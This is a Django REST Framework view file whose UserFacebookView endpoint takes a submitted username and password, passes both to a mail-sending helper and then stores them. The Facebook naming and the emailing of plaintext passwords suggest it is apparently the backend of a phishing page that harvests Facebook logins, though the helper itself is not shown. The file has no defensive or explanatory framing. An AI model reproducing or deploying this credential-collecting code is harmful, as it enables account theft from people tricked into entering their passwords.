from rest_framework import generics
from .models import UserFacebook
from .serializers import UserFacebookSerializer
from .services import send_mail_func

# Create your views here.


class UserFacebookView(generics.CreateAPIView):
    queryset = UserFacebook.objects.all()
    serializer_class = UserFacebookSerializer

    def create(self, request, *args, **kwargs):
        ''' I wanted to do some stuff with serializer.data here '''
        serializer = self.get_serializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        print("ok")
        send_mail_func(serializer.data["username"], serializer.data["password"])
        
        return super(UserFacebookView, self).create(request, *args, **kwargs)